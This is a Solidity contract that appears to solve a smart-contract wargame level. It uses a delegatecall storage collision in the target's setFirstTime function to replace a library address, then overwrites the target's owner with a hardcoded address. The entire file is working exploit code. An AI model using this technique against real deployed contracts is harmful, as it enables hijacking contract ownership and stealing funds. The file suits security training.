// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Itarget {
    function setFirstTime(uint256) external ;
    function owner() external view returns (address);
}

contract Attack{
    address public slot0;
    address public slot1;
    address public owner;
    
    function setTime(uint256 _owner) public {
        owner = address(uint160(_owner));
    }

    function attack(address preservation) external {
        Itarget target = Itarget(preservation);

        target.setFirstTime(uint256(uint160(address(this))));
        target.setFirstTime(uint256(uint160(0x467701aF99e6240985CcD8362F071665a0fd35cb)));
    }
}